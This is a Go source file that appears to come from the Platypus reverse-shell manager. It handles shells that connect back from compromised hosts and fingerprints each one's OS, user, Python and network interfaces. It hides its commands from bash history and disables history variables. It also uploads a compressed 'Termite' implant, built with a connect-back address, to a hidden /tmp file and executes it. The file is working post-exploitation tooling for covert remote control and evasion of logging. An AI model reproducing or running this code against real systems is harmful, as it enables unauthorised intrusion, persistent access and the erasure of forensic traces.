package context

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/WangYihang/Platypus/internal/util/compiler"
	"github.com/WangYihang/Platypus/internal/util/hash"
	"github.com/WangYihang/Platypus/internal/util/log"
	oss "github.com/WangYihang/Platypus/internal/util/os"
	"github.com/WangYihang/Platypus/internal/util/str"
	humanize "github.com/dustin/go-humanize"
	"github.com/jedib0t/go-pretty/table"
	"github.com/vbauerster/mpb/v6"
	"github.com/vbauerster/mpb/v6/decor"
	"golang.org/x/term"
)

type TCPClient struct {
	conn              net.Conn
	interactive       bool
	ptyEstablished    bool
	GroupDispatch     bool                `json:"group_dispatch"`
	Hash              string              `json:"hash"`
	Host              string              `json:"host"`
	Port              uint16              `json:"port"`
	Alias             string              `json:"alias"`
	User              string              `json:"user"`
	OS                oss.OperatingSystem `json:"os"`
	NetworkInterfaces map[string]string   `json:"network_interfaces"`
	Python2           string              `json:"python2"`
	Python3           string              `json:"python3"`
	TimeStamp         time.Time           `json:"timestamp"`
	echoEnabled       bool
	server            *TCPServer
	readLock          *sync.Mutex
	writeLock         *sync.Mutex
	interacting       *sync.Mutex
	mature            bool
}

func CreateTCPClient(conn net.Conn, server *TCPServer) *TCPClient {
	host := strings.Split(conn.RemoteAddr().String(), ":")[0]
	port, _ := strconv.Atoi(strings.Split(conn.RemoteAddr().String(), ":")[1])
	return &TCPClient{
		TimeStamp:         time.Now(),
		echoEnabled:       false,
		server:            server,
		conn:              conn,
		interactive:       false,
		ptyEstablished:    false,
		GroupDispatch:     false,
		Hash:              "",
		Host:              host,
		Port:              uint16(port),
		Alias:             "",
		NetworkInterfaces: map[string]string{},
		OS:                oss.Unknown,
		Python2:           "",
		Python3:           "",
		User:              "",
		readLock:          new(sync.Mutex),
		writeLock:         new(sync.Mutex),
		interacting:       new(sync.Mutex),
		mature:            false,
	}
}

func (c *TCPClient) Close() {
	c.conn.Close()
	if Ctx.Current == c {
		Ctx.Current = nil
	}
}

func (c *TCPClient) GetConnString() string {
	return c.conn.RemoteAddr().String()
}

func (c *TCPClient) GetHashFormat() string {
	return c.server.hashFormat
}

func (c *TCPClient) GetConn() net.Conn {
	return c.conn
}

func (c *TCPClient) GetInteractingLock() *sync.Mutex {
	return c.interacting
}

func (c *TCPClient) GetInteractive() bool {
	return c.interactive
}

func (c *TCPClient) SetInteractive(new bool) bool {
	old := c.interactive
	c.interactive = new
	return old
}

func (c *TCPClient) GetPtyEstablished() bool {
	return c.ptyEstablished
}

func (c *TCPClient) SetPtyEstablished(new bool) bool {
	old := c.ptyEstablished
	c.ptyEstablished = new
	return old
}

func (c *TCPClient) GetUsername() string {
	var username string
	if c.User == "" {
		username = "unknown"
	} else {
		username = c.User
	}
	return username
}

func (c *TCPClient) GetPrompt() string {
	if c.Alias != "" {
		return fmt.Sprintf(
			"[%s] (%s) %s [%s] » ",
			c.Alias,
			c.OS.String(),
			c.GetConnString(),
			c.GetUsername(),
		)
	}
	return fmt.Sprintf(
		"(%s) %s [%s] » ",
		c.OS.String(),
		c.GetConnString(),
		c.GetUsername(),
	)
}

func (c *TCPClient) AsTable() {
	t := table.NewWriter()
	t.SetOutputMirror(os.Stdout)
	t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Python", "Time", "Alias", "GroupDispatch"})
	t.AppendRow([]interface{}{
		c.Hash,
		c.conn.RemoteAddr().String(),
		c.OS.String(),
		c.User,
		c.Python2 != "" || c.Python3 != "",
		humanize.Time(c.TimeStamp),
		c.Alias,
		c.GroupDispatch,
	})
	t.Render()
}

func (c *TCPClient) makeHash(hashFormat string) string {
	data := ""
	if c.OS == oss.Linux {
		components := strings.Split(hashFormat, " ")
		mapping := map[string]string{
			"%i": strings.Split(c.conn.RemoteAddr().String(), ":")[0],
			"%u": c.User,
			"%o": c.OS.String(),
			"%m": fmt.Sprintf("%s", c.NetworkInterfaces),
			"%t": c.TimeStamp.String(),
		}
		for _, component := range components {
			if value, exists := mapping[component]; exists {
				data += value
				data += "\n"
			} else {
				data += component
			}
		}
	} else {
		data = c.conn.RemoteAddr().String()
	}
	log.Debug("Hashing: %s", data)
	return hash.MD5(data)
}

func (c *TCPClient) OnelineDesc() string {
	addr := c.conn.RemoteAddr()
	if c.mature {
		return fmt.Sprintf("[%s] %s://%s [%s]", c.Hash, addr.Network(), addr.String(), c.OS.String())
	} else {
		return fmt.Sprintf("[Premature Death] %s://%s [%s]", addr.Network(), addr.String(), c.OS.String())
	}
}

func (c *TCPClient) FullDesc() string {
	addr := c.conn.RemoteAddr()
	if c.mature {
		return fmt.Sprintf("[%s] %s://%s (connected at: %s) [%s] [%t]", c.Hash, addr.Network(), addr.String(),
			humanize.Time(c.TimeStamp), c.OS.String(), c.GroupDispatch)
	} else {
		return fmt.Sprintf("[Premature Death] %s://%s (connected at: %s) [%s] [%t]", addr.Network(), addr.String(),
			humanize.Time(c.TimeStamp), c.OS.String(), c.GroupDispatch)
	}
}

func (c *TCPClient) ReadUntilClean(token string) string {
	inputBuffer := make([]byte, 1)
	var outputBuffer bytes.Buffer
	for {
		c.conn.SetReadDeadline(time.Now().Add(time.Second * 1))
		n, err := c.ReadConnLock(inputBuffer)

		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Error("Read response timeout from client")
			} else {
				log.Error("Read from client failed")
				c.interactive = false
				Ctx.Current = nil
				Ctx.DeleteTCPClient(c)
				return outputBuffer.String()
			}
			break
		}

		outputBuffer.Write(inputBuffer[:n])
		// If found token, then finish reading
		if strings.HasSuffix(outputBuffer.String(), token) {
			break
		}
	}
	c.conn.SetReadDeadline(time.Time{})
	// log.Debug("%d bytes read from client", len(outputBuffer.String()))
	return outputBuffer.String()[:len(outputBuffer.String())-len(token)]
}

func (c *TCPClient) ReadUntil(token string) (string, bool) {
	inputBuffer := make([]byte, 1)
	var outputBuffer bytes.Buffer
	var isTimeout bool
	for {
		c.conn.SetReadDeadline(time.Now().Add(time.Second * 1))
		n, err := c.ReadConnLock(inputBuffer)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Error("Read response timeout from client")
				isTimeout = true
			} else {
				log.Error("Read from client failed")
				c.interactive = false
				Ctx.Current = nil
				Ctx.DeleteTCPClient(c)
				isTimeout = false
			}
			break
		}
		outputBuffer.Write(inputBuffer[:n])
		// If found token, then finish reading
		if strings.HasSuffix(outputBuffer.String(), token) {
			break
		}
	}
	c.conn.SetReadDeadline(time.Time{})
	// log.Info("%d bytes read from client", len(outputBuffer.String()))
	return outputBuffer.String(), isTimeout
}

func (c *TCPClient) ReadSize(size int) string {
	readSize := 0
	inputBuffer := make([]byte, 1)
	var outputBuffer bytes.Buffer
	for {
		c.conn.SetReadDeadline(time.Now().Add(time.Second * 1))
		n, err := c.ReadConnLock(inputBuffer)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Error("Read response timeout from client")
			} else {
				log.Error("Read from client failed")
				c.interactive = false
				Ctx.Current = nil
				Ctx.DeleteTCPClient(c)
			}
			break
		}
		// If read size equals zero, then finish reading
		outputBuffer.Write(inputBuffer[:n])
		readSize += n
		if readSize >= size {
			break
		}
	}
	c.conn.SetReadDeadline(time.Time{})
	// log.Info("(%d/%d) bytes read from client", len(outputBuffer.String()), size)
	return outputBuffer.String()
}

func (c *TCPClient) Read(timeout time.Duration) (string, bool) {
	inputBuffer := make([]byte, 0x400)
	var outputBuffer bytes.Buffer
	var isTimeout bool
	for {
		// Set read time out
		c.conn.SetReadDeadline(time.Now().Add(timeout))
		n, err := c.ReadConnLock(inputBuffer)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				isTimeout = true
			} else {
				log.Error("Read from client failed")
				c.interactive = false
				Ctx.Current = nil
				Ctx.DeleteTCPClient(c)
				isTimeout = false
			}
			break
		}
		outputBuffer.Write(inputBuffer[:n])
	}
	// Reset read time out
	c.conn.SetReadDeadline(time.Time{})

	return outputBuffer.String(), isTimeout
}

func (c *TCPClient) ReadConnLock(b []byte) (int, error) {
	c.readLock.Lock()
	n, err := c.conn.Read(b)
	c.readLock.Unlock()
	return n, err
}

func (c *TCPClient) tryReadEcho(echo string) (bool, string) {
	// Check whether the client enable terminal echo
	inputBuffer := make([]byte, 1)
	var outputBuffer bytes.Buffer
	var echoEnabled bool = true

	// Clean all prompt
	// eg: `root@root:/root# `
	c.Read(time.Second * 1)

	// Ping
	c.Write([]byte(echo + "\n"))

	// Read pong and check the echo
	for _, ch := range echo {
		// Set read time out
		c.conn.SetReadDeadline(time.Now().Add(time.Second * 1))
		n, err := c.ReadConnLock(inputBuffer)
		if err == nil {
			outputBuffer.Write(inputBuffer[:n])
			if byte(ch) != inputBuffer[0] {
				echoEnabled = false
				break
			}
		} else {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				echoEnabled = false
			} else {
				log.Error("Read from client failed")
				c.interactive = false
				Ctx.Current = nil
				Ctx.DeleteTCPClient(c)
			}
			break
		}
	}

	// Return echoEnabled and misread data (when echoEnabled is false)
	return echoEnabled, outputBuffer.String()
}

func (c *TCPClient) Write(data []byte) int {
	c.writeLock.Lock()
	n, err := c.conn.Write(data)
	c.writeLock.Unlock()

	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			log.Error("Write to client timeout from client")
		} else {
			log.Error("Write to client failed, ")
			c.interactive = false
			Ctx.Current = nil
			Ctx.DeleteTCPClient(c)
		}
	}

	log.Debug("%d bytes sent to client", n)
	return n
}

func (c *TCPClient) SelectPython() string {
	if c.Python3 != "" {
		return c.Python3
	}
	if c.Python2 != "" {
		return c.Python2
	}
	return ""
}

func (c *TCPClient) FileSize(filename string) (int, error) {
	exists, err := c.FileExists(filename)
	if err != nil {
		return 0, err
	}

	python := c.SelectPython()
	if exists {
		if c.OS == oss.Linux {
			if python != "" {
				command := fmt.Sprintf(
					"%s -c 'print(len(open(__import__(\"base64\").b64decode(b\"%s\"), \"rb\").read()))'",
					python,
					base64.StdEncoding.EncodeToString([]byte(filename)),
				)
				size, err := strconv.Atoi(strings.TrimSpace(c.SystemToken(command)))
				if err != nil {
					return 0, err
				} else {
					return size, nil
				}
			} else {
				return 0, errors.New("no python on target machine")
			}
		} else if c.OS == oss.Windows {
			if python != "" {
				command := fmt.Sprintf(
					"%s -c \"print(len(open(__import__('base64').b64decode(b'%s'), 'rb').read()))\"",
					python,
					base64.StdEncoding.EncodeToString([]byte(filename)),
				)
				size, err := strconv.Atoi(strings.TrimSpace(c.SystemToken(command)))
				if err != nil {
					return 0, err
				} else {
					return size, nil
				}
			} else {
				return 0, errors.New("no python on target machine")
			}
		} else {
			return 0, fmt.Errorf("unsupported OS: %s", c.OS)
		}
	} else {
		return 0, errors.New("no such file")
	}
}

func (c *TCPClient) ReadFileEx(filename string, start int, length int) (string, error) {
	exists, err := c.FileExists(filename)
	if err != nil {
		return "", err
	}
	if exists {
		if c.OS == oss.Linux {
			if c.Python3 != "" {
				command := fmt.Sprintf(
					"%s -c 'f=open(__import__(\"base64\").b64decode(b\"%s\"), \"rb\");f.seek(%d);print(str(__import__(\"base64\").b64encode(f.read(%d)),encoding=\"utf-8\"));'",
					c.Python3,
					base64.StdEncoding.EncodeToString([]byte(filename)),
					start,
					length,
				)
				decoded, _ := base64.StdEncoding.DecodeString(c.SystemToken(command))
				return string(decoded), nil
			} else if c.Python2 != "" {
				command := fmt.Sprintf(
					"%s -c 'f=open(__import__(\"base64\").b64decode(b\"%s\"), \"rb\");f.seek(%d);print(__import__(\"base64\").b64encode(f.read(%d)));'",
					c.Python2,
					base64.StdEncoding.EncodeToString([]byte(filename)),
					start,
					length,
				)
				decoded, _ := base64.StdEncoding.DecodeString(c.SystemToken(command))
				return string(decoded), nil
			} else {
				log.Error("No python on target machine, trying to read file using premitive method.")
				return c.ReadFile(filename)
			}
		} else if c.OS == oss.Windows {
			if c.Python3 != "" {
				command := fmt.Sprintf(
					"%s -c \"f=open(__import__('base64').b64decode(b'%s'), 'rb');f.seek(%d);print(str(__import__('base64').b64encode(f.read(%d)),encoding='utf-8'));\"",
					c.Python3,
					base64.StdEncoding.EncodeToString([]byte(filename)),
					start,
					length,
				)
				decoded, _ := base64.StdEncoding.DecodeString(c.SystemToken(command))
				return string(decoded), nil
			} else if c.Python2 != "" {
				command := fmt.Sprintf(
					"%s -c \"f=open(__import__('base64').b64decode(b'%s'), 'rb');f.seek(%d);print(__import__('base64').b64encode(f.read(%d)));\"",
					c.Python2,
					base64.StdEncoding.EncodeToString([]byte(filename)),
					start,
					length,
				)
				decoded, _ := base64.StdEncoding.DecodeString(c.SystemToken(command))
				return string(decoded), nil
			} else {
				log.Error("No python on target machine, trying to read file using premitive method.")
				return c.ReadFile(filename)
			}
		} else {
			return "", fmt.Errorf("unsupported OS: %s", c.OS)
		}

	} else {
		return "", errors.New("no such file")
	}
}

func (c *TCPClient) ReadFile(filename string) (string, error) {
	exists, err := c.FileExists(filename)
	if err != nil {
		return "", err
	}

	if exists {
		if c.OS == oss.Linux {
			return c.SystemToken("cat " + filename), nil
		}
		return c.SystemToken("type " + filename), nil
	} else {
		return "", errors.New("no such file")
	}
}

func (c *TCPClient) FileExists(path string) (bool, error) {
	python := c.SelectPython()
	switch c.OS {
	case oss.Linux:
		return strings.TrimSpace(c.SystemToken("ls "+path)) == strings.TrimSpace(path), nil
	case oss.Windows:
		if python != "" {
			// Python2 and Python3 all works fine in this situation
			command := fmt.Sprintf(
				"%s -c \"print(__import__('os').path.exists(__import__('base64').b64decode(b'%s')))\"",
				python,
				base64.StdEncoding.EncodeToString([]byte(path)),
			)
			return strings.TrimSpace(c.SystemToken(command)) == "True", nil
		} else {
			return false, errors.New("no python on the target machine")
		}
	default:
		return false, errors.New("unrecognized operating system")
	}
}

func (c *TCPClient) System(command string) {
	// https://www.technovelty.org/linux/skipping-bash-history-for-command-lines-starting-with-space.html
	// Make bash not store command history
	c.Write([]byte(" " + command + "\n"))
}

func (c *TCPClient) SetWindowSize(ws *WindowSize) {
	// BUG: Require in shell mode, (if in interactive mode, this call will fail)
	commands := []string{
		fmt.Sprintf("stty rows %d columns %d", ws.Rows, ws.Columns),
	}
	log.Info("Resetting Windows Size to: %d, %d", ws.Rows, ws.Columns)
	for _, command := range commands {
		c.SystemToken(command)
	}
}

func (c *TCPClient) EstablishPTY() error {
	if c.GetPtyEstablished() {
		return errors.New("PTY is already established in the current client")
	}

	if c.OS == oss.Windows {
		return errors.New("fully interactive PTY on Windows client is not supported")
	}

	python := c.SelectPython()
	if python == "" {
		return errors.New("fully interactive PTY require Python on the current client")
	}

	// Step 1: Spawn /bin/sh via pty of victim
	command := "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
	log.Info("spawning /bin/bash on the current client")
	c.System(command)

	// TODO: Check whether pty is established
	c.ptyEstablished = true

	// Step 2: Get attacker pty window size
	width, height, _ := term.GetSize(int(os.Stdin.Fd()))
	log.Info("attcker window size: (%d, %d)", width, height)

	// Step 3: Reset victim window size to fit attacker window size
	log.Info("reseting client terminal...")
	c.System("reset")
	log.Info("reseting client SHELL...")
	c.System("export SHELL=bash")
	log.Info("reseting client TERM colors...")
	c.System("export TERM=xterm-256color")
	log.Info("reseting client window size...")
	c.System(fmt.Sprintf("stty rows %d columns %d", height, width))

	// Step 4: Disable history
	c.disableHistory()

	c.SetPtyEstablished(true)
	// TODO: Check pty establish status
	return nil
}

func (c *TCPClient) SystemToken(command string) string {
	tokenA := str.RandomString(0x08)
	tokenB := str.RandomString(0x08)

	var input string

	// Construct command to execute
	// ; echo tokenB and & echo tokenB are for commands which will be execute unsuccessfully
	if c.OS == oss.Windows {
		// For Windows client
		input = "echo " + tokenA + " && " + command + " & echo " + tokenB
	} else {
		// For Linux client
		input = "echo " + tokenA + " && " + command + " ; echo " + tokenB
	}

	c.System(input)

	if c.echoEnabled {
		// TODO: test restful api, execute system
		// Read Pty Echo as junk
		c.ReadUntil(tokenB)
	}

	var isTimeout bool
	if c.OS == oss.Windows {
		// For Windows client
		_, isTimeout = c.ReadUntil(tokenA + " \r\n")
	} else {
		// For Linux client
		_, isTimeout = c.ReadUntil(tokenA + "\n")
	}

	// If read response timeout from client, returns directly
	if isTimeout {
		return ""
	}

	output, _ := c.ReadUntil(tokenB)
	result := strings.Split(output, tokenB)[0]
	return result
}

func (c *TCPClient) detectUser() {
	switch c.OS {
	case oss.Linux:
		c.User = strings.TrimSpace(c.SystemToken("whoami"))
		log.Debug("[%s] User detected: %s", c.conn.RemoteAddr().String(), c.User)
	case oss.Windows:
		c.User = strings.TrimSpace(c.SystemToken("whoami"))
		log.Debug("[%s] User detected: %s", c.conn.RemoteAddr().String(), c.User)
	default:
		log.Error("[%s] Unrecognized operating system", c.conn.RemoteAddr().String())
	}
}

func (c *TCPClient) detectPython() {
	var result string
	var version string
	if c.OS == oss.Windows {
		// On windows platform, there is a fake python interpreter:
		// %HOME%\AppData\Local\Microsoft\WindowsApps\python.exe
		// The windows app store will be opened if the user didn't install python from the store
		// This situation will be fuzzy to us.
		result = strings.TrimSpace(c.SystemToken("where python"))
		if strings.HasSuffix(result, "python.exe") {
			version = strings.TrimSpace(c.SystemToken("python --version"))
			if strings.HasPrefix(version, "Python 3") {
				c.Python3 = strings.TrimSpace(strings.Split(result, "\n")[0])
				log.Debug("[%s] Python3 found: %s", c.conn.RemoteAddr().String(), c.Python3)
				result = strings.TrimSpace(c.SystemToken("where python2"))
				if strings.HasSuffix(result, "python2.exe") {
					c.Python2 = strings.TrimSpace(strings.Split(result, "\n")[0])
					log.Debug("[%s] Python2 found: %s", c.conn.RemoteAddr().String(), result)
				}
			} else if strings.HasPrefix(version, "Python 2") {
				c.Python2 = strings.TrimSpace(strings.Split(result, "\n")[0])
				log.Debug("[%s] Python2 found: %s", c.conn.RemoteAddr().String(), c.Python2)
				result = strings.TrimSpace(c.SystemToken("where python3"))
				if strings.HasSuffix(result, "python3.exe") {
					c.Python3 = strings.TrimSpace(strings.Split(result, "\n")[0])
					log.Debug("[%s] Python3 found: %s", c.conn.RemoteAddr().String(), result)
				}
			} else {
				log.Error("[%s] Unrecognized python version: %s", c.conn.RemoteAddr().String(), version)
			}
		} else {
			log.Error("[%s] No python on traget machine.", c.conn.RemoteAddr().String())
		}
	} else if c.OS == oss.Linux {
		result = strings.TrimSpace(c.SystemToken("which python2"))
		if result != "" {
			c.Python2 = strings.TrimSpace(strings.Split(result, "\n")[0])
			log.Debug("[%s] Python2 found: %s", c.conn.RemoteAddr().String(), result)
		}
		result = strings.TrimSpace(c.SystemToken("which python3"))
		if result != "" {
			c.Python3 = strings.TrimSpace(strings.Split(result, "\n")[0])
			log.Debug("[%s] Python3 found: %s", c.conn.RemoteAddr().String(), result)
		}
	} else {
		log.Error("[%s] Unsupported OS: %s", c.conn.RemoteAddr().String(), c.OS.String())
	}
}

func (c *TCPClient) detectNetworkInterfaces() {
	if c.OS == oss.Linux {
		ifnames := strings.Split(strings.TrimSpace(c.SystemToken("ls /sys/class/net")), "\n")
		for _, ifname := range ifnames {
			mac, err := c.ReadFile(fmt.Sprintf("/sys/class/net/%s/address", ifname))
			if err != nil {
				log.Error("[%s] Detect network interfaces failed: %s", c.conn.RemoteAddr().String(), err)
				return
			}
			c.NetworkInterfaces[ifname] = strings.TrimSpace(mac)
			log.Debug("[%s] Network Interface (%s): %s", c.conn.RemoteAddr().String(), ifname, mac)
		}
	}
}

func (c *TCPClient) disableHistory() {
	if c.OS != oss.Windows {
		c.System("export HISTORY=")
		c.System("export HISTSIZE=0")
		c.System("export HISTSAVE=")
		c.System("export HISTZONE=")
		c.System("export HISTLOG=")
		c.System("export HISTFILE=/dev/null")
		c.System("export HISTFILESIZE=0")
	}
}

func (c *TCPClient) detectOS() {
	tokenA := str.RandomString(0x08)
	tokenB := str.RandomString(0x08)
	// For Unix-Like OSs
	command := fmt.Sprintf("echo %s; uname ; echo %s", tokenA, tokenB)
	c.System(command)

	if c.echoEnabled {
		// Read echo
		c.ReadUntil(tokenB)
		c.ReadUntil(tokenA)
	}
	output, _ := c.ReadUntil(tokenB)

	kwos := map[string]oss.OperatingSystem{
		"linux":   oss.Linux,
		"sunos":   oss.SunOS,
		"freebsd": oss.FreeBSD,
		"darwin":  oss.MacOS,
	}
	for keyword, os := range kwos {
		if strings.Contains(strings.ToLower(output), keyword) {
			c.OS = os
			log.Debug("[%s] OS detected: %s", c.conn.RemoteAddr().String(), c.OS.String())
			if c.server.DisableHistory {
				c.disableHistory()
			}
			return
		}
	}

	// For Windows
	c.System(fmt.Sprintf("echo %s & ver & echo %s", tokenA, tokenB))

	if c.echoEnabled {
		// Read echo
		c.ReadUntil(tokenB)
		c.ReadUntil(tokenA)
	}
	output, _ = c.ReadUntil(tokenB)
	log.Info(output)
	if strings.Contains(strings.ToLower(output), "windows") {
		// CMD
		c.OS = oss.Windows
		log.Debug("[%s] OS detected: %s", c.conn.RemoteAddr().String(), c.OS.String())
		return
	}

	if output == "\r\n"+tokenA+"\r\n"+tokenB {
		// Powershell
		c.OS = oss.WindowsPowerShell
		log.Debug("[%s] OS detected: %s with PowerShell", c.conn.RemoteAddr().String(), c.OS.String())
		return
	}

	// Unknown OS
	log.Error("[%s] OS detection failed, set OS = `Unknown`", c.conn.RemoteAddr().String())
	c.OS = oss.Unknown
}

func (c *TCPClient) GatherClientInfo(hashFormat string) {
	log.Info("Gathering information from client...")
	echoEnabled, _ := c.tryReadEcho(str.RandomString(0x10))
	c.echoEnabled = echoEnabled
	c.detectOS()
	c.detectUser()
	c.detectPython()
	c.detectNetworkInterfaces()
	c.Hash = c.makeHash(hashFormat)
	c.mature = true
}

func (client *TCPClient) NotifyWebSocketCompilingTermite(progress int) {
	if Ctx.NotifyWebSocket != nil {
		// WebSocket Broadcast
		type CompilingTermite struct {
			Client     TCPClient
			ServerHash string
			Progress   int
		}
		msg, _ := json.Marshal(WebSocketMessage{
			Type: COMPILING_TERMITE,
			Data: CompilingTermite{
				Client:     *client,
				ServerHash: client.server.Hash,
				Progress:   progress,
			},
		})
		// Notify to all websocket clients
		Ctx.NotifyWebSocket.Broadcast(msg)
	}
}

func (client *TCPClient) NotifyWebSocketCompressingTermite(progress int) {
	if Ctx.NotifyWebSocket != nil {
		// WebSocket Broadcast
		type CompressingTermite struct {
			Client     TCPClient
			ServerHash string
			Progress   int
		}
		msg, _ := json.Marshal(WebSocketMessage{
			Type: COMPRESSING_TERMITE,
			Data: CompressingTermite{
				Client:     *client,
				ServerHash: client.server.Hash,
				Progress:   progress,
			},
		})
		// Notify to all websocket clients
		Ctx.NotifyWebSocket.Broadcast(msg)
	}
}

func (client *TCPClient) NotifyWebSocketUploadingTermite(bytesSent int, bytesTotal int) {
	if Ctx.NotifyWebSocket != nil {
		// WebSocket Broadcast
		type UploadingTermite struct {
			Client     TCPClient
			ServerHash string
			BytesSent  int
			BytesTotal int
		}
		msg, _ := json.Marshal(WebSocketMessage{
			Type: UPLOADING_TERMITE,
			Data: UploadingTermite{
				Client:     *client,
				ServerHash: client.server.Hash,
				BytesSent:  bytesSent,
				BytesTotal: bytesTotal,
			},
		})
		// Notify to all websocket clients
		Ctx.NotifyWebSocket.Broadcast(msg)
	}
}

func (c *TCPClient) UpgradeToTermite(connectBackHostPort string) {
	if c.OS == oss.Windows {
		// TODO: Windows Upgrade
		log.Error("Upgrade to Termite on Windows client is not supported")
		return
	}

	// Step 0: Generate temp folder and filename
	dir, filename, err := compiler.GenerateDirFilename()
	if err != nil {
		log.Error(fmt.Sprint(err))
		return
	}
	defer os.RemoveAll(dir)

	// Step 1: Generate Termite from Assets
	c.NotifyWebSocketCompilingTermite(0)
	err = compiler.BuildTermiteFromPrebuildAssets(filename, connectBackHostPort)
	if err != nil {
		c.NotifyWebSocketCompilingTermite(-1)
	} else {
		c.NotifyWebSocketCompilingTermite(100)
	}

	// Step 2: Upx compression
	c.NotifyWebSocketCompressingTermite(0)
	if !compiler.Compress(filename) {
		c.NotifyWebSocketCompressingTermite(-1)
	} else {
		c.NotifyWebSocketCompressingTermite(100)
	}

	// Upload Termite Binary
	dst := fmt.Sprintf("/tmp/.%s", str.RandomString(0x10))
	if !c.Upload(filename, dst, true) {
		log.Error("Upload failed")
		return
	}

	// Execute Termite Binary
	// On Ubuntu Server 20.04.2 TencentCloud, the chmod binary is stored at
	// /bin/chmod. This would cause the execution of termite failed. So we
	// use the relative command `chmod` instead of `/usr/bin/chmod`
	c.SystemToken(fmt.Sprintf("chmod +x %s && %s", dst, dst))
}

func (c *TCPClient) Upload(src string, dst string, broadcast bool) bool {
	// Check existance of remote path
	dstExists, err := c.FileExists(dst)
	if err != nil {
		log.Error(err.Error())
		return false
	}

	if dstExists {
		log.Error("The target path is occupied, please select another destination")
		return false
	}

	// Read local file content
	content, err := ioutil.ReadFile(src)
	if err != nil {
		log.Error(err.Error())
		return false
	}

	log.Info("Uploading %s to %s", src, dst)

	// 1k Segment
	segmentSize := 0x1000

	bytesSent := 0
	totalBytes := len(content)

	c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)

	segments := totalBytes / segmentSize
	overflowedBytes := totalBytes - segments*segmentSize

	p := mpb.New(
		mpb.WithWidth(64),
	)

	bar := p.Add(int64(totalBytes), mpb.NewBarFiller("[=>-|"),
		mpb.PrependDecorators(
			decor.CountersKibiByte("% .2f / % .2f"),
		),
		mpb.AppendDecorators(
			decor.EwmaETA(decor.ET_STYLE_HHMMSS, 60),
			decor.Name(" ] "),
			decor.EwmaSpeed(decor.UnitKB, "% .2f", 60),
		),
	)

	// Firstly, use redirect `>` to create file, and write the overflowed bytes
	start := time.Now()
	c.SystemToken(fmt.Sprintf(
		"echo %s| base64 -d > %s",
		base64.StdEncoding.EncodeToString(content[0:overflowedBytes]),
		dst,
	))

	bar.IncrBy(overflowedBytes)

	bytesSent += overflowedBytes
	c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)

	bar.DecoratorEwmaUpdate(time.Since(start))

	// Secondly, use `>>` to append all segments left except the final one
	for i := 0; i < segments; i++ {
		start = time.Now()
		c.SystemToken(fmt.Sprintf(
			"echo %s| base64 -d >> %s",
			base64.StdEncoding.EncodeToString(content[overflowedBytes+i*segmentSize:overflowedBytes+(i+1)*segmentSize]),
			dst,
		))
		bytesSent += segmentSize
		bar.IncrBy(segmentSize)
		bar.DecoratorEwmaUpdate(time.Since(start))

		if broadcast && i%0x10 == 0 {
			c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
		}
	}
	p.Wait()
	c.NotifyWebSocketUploadingTermite(bytesSent, totalBytes)
	return true
}
